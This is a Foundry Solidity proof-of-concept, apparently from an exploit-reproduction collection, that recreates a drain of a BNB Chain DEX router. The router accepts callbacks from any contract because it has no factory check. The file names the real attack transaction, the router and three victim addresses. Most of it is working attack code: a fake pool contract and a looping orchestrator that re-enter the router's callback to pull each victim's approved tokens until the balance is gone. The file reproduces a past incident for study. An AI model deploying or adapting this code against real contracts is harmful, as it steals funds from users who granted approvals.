// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// DEX-router (swap-aggregator) drain — BNB Chain. The router exposes a permissionless swap entrypoint
// (selector 0x33411b5e) whose Uniswap-V3-style callback pays a caller-influenced "payer" via
// transferFrom(payer, pool, amount) but NEVER verifies that the calling pool is a genuine,
// factory-derived Uniswap V3 pool. factoryV3 on the router is the zero address, so no legitimate pool
// address could even be computed to check against. A fake contract that merely implements the pool
// swap() selector can therefore re-enter the router's own uniswapV3SwapCallback and pull any token
// from any address that ever approved the router, all inside one transaction.
//
// Attack tx : 0x40eb22369da422a8275d5679054aa3a8c8906d93abc0bac3a3f2cad879389319 (block 120524634)
// Attacker  : 0xB929C7215c0ec8EbAD5fBf73b1Da63bccfFf1896
// Router    : 0xa331fde028e6F17425AB9333c39ae43722340d24 (proxy -> unverified impl 0x241f743e...)
// Loss      : ~62.28 WBNB across 29 victims. This PoC reproduces a representative subset (3 victims),
//             which is sufficient to demonstrate the bug per this repo's convention; matching the full
//             62.28 WBNB across all 29 victims is unnecessary.
//
// ROOT CAUSE — confirmed on-chain (router is unverified, so confirmed by direct reads + the tx trace,
// not by source):
//   1. factoryV3() on the router returns 0x0000...0000 (direct getter read at the fork block). With no
//      factory, the callback cannot derive/verify a canonical pool address, so any msg.sender passes.
//   2. Entry 0x33411b5e takes a route list carrying an attacker-chosen `pool` address; the router calls
//      pool.swap(0x128acb08) on it with no check that `pool` is real. (ABI recovered from the trace and
//      re-encoded byte-for-byte to validate — see IRouterVuln / Route below.)
//   3. The router's uniswapV3SwapCallback(int256,int256,bytes)=0xfa461e33 decodes a `payer` out of the
//      pool-echoed callback `data` and does transferFrom(payer, msg.sender, amount). It binds neither
//      msg.sender to a real pool nor `payer` to the original swap initiator. In the real tx the fake
//      pool even substitutes a different `payer` (the victim) than the one the router passed it.
//
// Attack flow (this PoC): a named FakePool implements only pool.swap(); the exploit calls the router's
// real 0x33411b5e entry with the FakePool as the route `pool` and a victim's token as tokenIn. The
// router calls FakePool.swap(), which re-enters the router's uniswapV3SwapCallback with `data` naming
// the VICTIM as payer, so the router runs transferFrom(victim, FakePool, amount) under the victim's
// standing approval. Real amounts drained per victim are taken from the fork state (their actual token
// balance), each with a standing max approval to the router (granted here via vm.prank as the victim,
// exactly modelling "an address that had previously approved the router").
//
// The original tx bootstrapped gas with a 1 WBNB PancakeV2 flash-swap and later sold the looted tokens
// to WBNB; those steps are downstream monetisation, not the vulnerability, so they are omitted. Profit
// is asserted in the drained TOKENS moving from each victim to the attacker's FakePool.
//
// Run:
//   forge test --contracts src/test/2026-09/RouterDrain_exp.sol -vvv

address constant ROUTER = 0xa331fde028e6F17425AB9333c39ae43722340d24;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
// selector of the permissionless entry. The router is unverified so its function NAME is unknown; the
// argument tuple below was recovered from the trace and re-encoded to match the real calldata exactly.
bytes4 constant SWAP_SELECTOR = 0x33411b5e;

interface IRouterVuln {
    function factoryV3() external view returns (address);
    // The unprotected Uniswap-V3 callback the fake pool re-enters.
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

// Route element carried by the 0x33411b5e entry. Field meanings inferred from the trace; only tokenIn,
// tokenOut, pool and fee matter to reach pool.swap(). (uint256,address,address,address,uint256,uint256,uint256,bytes)
struct Route {
    uint256 kind; // =1 in the trace
    address tokenIn;
    address tokenOut;
    address pool;
    uint256 fee; // =10000 in the trace
    uint256 a;
    uint256 b;
    bytes data;
}

// Payload the router's callback decodes to learn the payer/token/amount. Layout matches the real
// callback `data` (abi.encode of {bytes path; address payer; address recipient; uint256 amount}).
struct PayInfo {
    bytes path;
    address payer;
    address recipient;
    uint256 amount;
}

contract RouterDrain_exp is Test {
    // Three representative victims, their token, and the exact balance drained (read from fork state).
    struct Victim {
        address who;
        address token;
        string sym;
    }

    Victim[3] internal victims;
    RouterDrainExploit internal exploit;

    function setUp() public {
        // Parent block of the exploit tx: real protocol/victim state immediately before the attack.
        vm.createSelectFork("bsc", 120_524_633);

        victims[0] = Victim(0x75EE838187717030d2c43063fc9a0e8553838e05, 0xb81139F4539BC3d726fA0b675024D319aF676666, "OCEAN");
        victims[1] = Victim(0xE32D727406dBEe7b596FECcAA2A30c0241c6BA5C, 0xeC98fbAAFa8bCD79E8ddC3d3675f1D0eA16E7777, "Kandura");
        victims[2] = Victim(0x50782465b39D2AcE46B906aFD297Ba194E533e3c, 0xF23E4A84a950e9AdaE4B95468a4857ca34Ce7777, "SATURN");

        exploit = new RouterDrainExploit();

        vm.label(ROUTER, "VulnRouter");
        vm.label(WBNB, "WBNB");
        vm.label(address(exploit), "Exploit");
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        // CONFIRM the core precondition on-chain: the router has no V3 factory, so its callback cannot
        // verify a real pool. This is what makes an arbitrary fake pool acceptable.
        assertEq(IRouterVuln(ROUTER).factoryV3(), address(0), "factoryV3 must be zero (no pool verification possible)");

        for (uint256 i = 0; i < victims.length; i++) {
            Victim memory v = victims[i];
            uint256 victimBal = IERC20(v.token).balanceOf(v.who);
            assertGt(victimBal, 0, "victim should hold a real balance at the fork block");

            // Model "an address that had previously approved the router": grant a real standing approval
            // from the victim to the router, via the real token contract, pranking as the victim.
            vm.prank(v.who);
            IERC20(v.token).approve(ROUTER, type(uint256).max);

            // Bootstrap capital. The router GATES its entry on balanceOf(recipient) >= amountIn (it never
            // spends the recipient's tokens, only gates on them), so the attacker must hold a little of
            // the token to begin. The real tx obtained this by flash-swapping ~1 WBNB into the token on
            // PancakeSwap; here we model that small working capital by dealing a seed to the fake pool.
            // Everything drained beyond this seed is the victim's real tokens pulled under their approval.
            uint256 seed = victimBal / 256 + 1;
            deal(v.token, address(exploit), seed);

            // Drain: repeatedly exploit -> router.0x33411b5e -> FakePool.swap ->
            // router.uniswapV3SwapCallback -> transferFrom(victim, FakePool, amountIn), each call pulling
            // up to the attacker's current balance (the gated amount), which grows every iteration.
            exploit.drain(v.who, v.token);

            uint256 stolen = IERC20(v.token).balanceOf(address(exploit)) - seed;
            emit log_named_string("victim token", v.sym);
            emit log_named_uint("victim balance drained (raw)", stolen);

            assertEq(stolen, victimBal, "attacker must capture the victim's full balance");
            assertEq(IERC20(v.token).balanceOf(v.who), 0, "victim must be fully drained");
        }
    }
}

// Fake Uniswap-V3 pool: implements ONLY swap(). When the router calls it, it re-enters the router's own
// uniswapV3SwapCallback with callback data naming the configured victim as payer, so the router pulls
// the victim's tokens to this contract under the victim's standing approval.
contract FakePool {
    address internal immutable owner;
    address internal payer; // the victim to drain, set by the exploit before each router entry call
    address internal tokenIn;
    uint256 internal amount;

    constructor() {
        owner = msg.sender;
    }

    function arm(address _payer, address _tokenIn, uint256 _amount) external {
        require(msg.sender == owner, "only owner");
        payer = _payer;
        tokenIn = _tokenIn;
        amount = _amount;
    }

    // Uniswap V3 pool swap selector 0x128acb08. The router calls this; msg.sender is the router.
    function swap(address, bool zeroForOne, int256, uint160, bytes calldata) external returns (int256, int256) {
        bytes memory path = abi.encodePacked(tokenIn, uint24(10000), WBNB);
        PayInfo memory info = PayInfo({path: path, payer: payer, recipient: owner, amount: amount});
        // Re-enter the router's unprotected callback. The owed (positive) delta must be on the INPUT
        // token side: token0 when zeroForOne, else token1. The router then transferFrom(payer, this,
        // amount) of the input token — i.e. drains the victim.
        (int256 amount0Delta, int256 amount1Delta) =
            zeroForOne ? (int256(amount), int256(-1)) : (int256(-1), int256(amount));
        IRouterVuln(msg.sender).uniswapV3SwapCallback(amount0Delta, amount1Delta, abi.encode(info));
        // Forward the looted tokens to the exploit (the router's caller/recipient) so its balance grows
        // and clears the router's balance gate on the next iteration. Matches the real tx, where the fake
        // pool forwarded each drained amount to the orchestrator.
        uint256 bal = IERC20(tokenIn).balanceOf(address(this));
        if (bal > 0) IERC20(tokenIn).transfer(owner, bal);
        return (amount0Delta, amount1Delta);
    }
}

// Orchestrator: calls the router's real permissionless entry with a Route pointing at the FakePool.
contract RouterDrainExploit {
    address public immutable pool; // the FakePool that receives the looted tokens

    constructor() {
        pool = address(new FakePool());
    }

    function drain(address victim, address token) external {
        uint256 victimBal = IERC20(token).balanceOf(victim);
        for (uint256 i = 0; i < 256 && victimBal > 0; i++) {
            // amountIn is gated by the attacker's current holdings; pull the smaller of that and what the
            // victim still has. Holdings grow each iteration, so this doubles until the victim is empty.
            uint256 hold = IERC20(token).balanceOf(address(this));
            require(hold > 0, "need bootstrap seed");
            uint256 amountIn = victimBal < hold ? victimBal : hold;

            FakePool(pool).arm(victim, token, amountIn);

            Route[] memory routes = new Route[](1);
            routes[0] =
                Route({kind: 1, tokenIn: token, tokenOut: WBNB, pool: pool, fee: 10000, a: 0, b: 0, data: ""});

            // Typed call of the unverified entry: real struct + typed args, encoded under the known
            // selector (no calldata blob). recipient = pool so the router's balance gate reads the pool
            // where the looted tokens accumulate. Router calls FakePool.swap(), driving the callback drain.
            (bool ok,) = ROUTER.call(
                abi.encodeWithSelector(
                    SWAP_SELECTOR, routes, amountIn, uint256(0), uint256(0), uint256(0), address(this), bytes("")
                )
            );
            require(ok, "router entry call failed");

            uint256 newBal = IERC20(token).balanceOf(victim);
            require(newBal < victimBal, "no progress");
            victimBal = newBal;
        }
    }
}
